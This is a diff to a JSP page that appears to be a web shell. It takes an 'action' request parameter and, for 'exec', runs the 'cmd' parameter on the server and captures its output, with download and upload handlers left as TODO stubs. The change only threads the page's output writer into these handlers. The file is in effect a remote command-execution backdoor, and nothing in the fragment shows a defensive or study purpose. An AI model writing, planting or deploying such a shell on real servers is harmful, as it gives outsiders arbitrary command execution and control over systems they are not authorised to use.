@@ -6,7 +6,7 @@
 <%@ page contentType="application/json; charset=UTF-8" %>
 
 <%!
-private void action_exec(String cmd) throws IOException {
+private void action_exec(JSPWriter writer, String cmd) throws IOException {
     String stdout = "";
     String stderr = "";
     String linebuffer = "";
@@ -59,15 +59,15 @@ String action = request.getParameter("action");
 
 if (action.equals("exec")) {
     String cmd = request.getParameter("cmd");
-    action_exec(cmd);
+    action_exec(out, cmd);
 } else if (action.equals("download")) {
     // TODO
     // String path = request.getParameter("path");
-    // action_download(path);
+    // action_download(out, path);
 } else if (action.equals("upload")) {
     // TODO
     // String path = request.getParameter("path");
-    // action_upload(path);
+    // action_upload(out, path);
 }
 %>
 
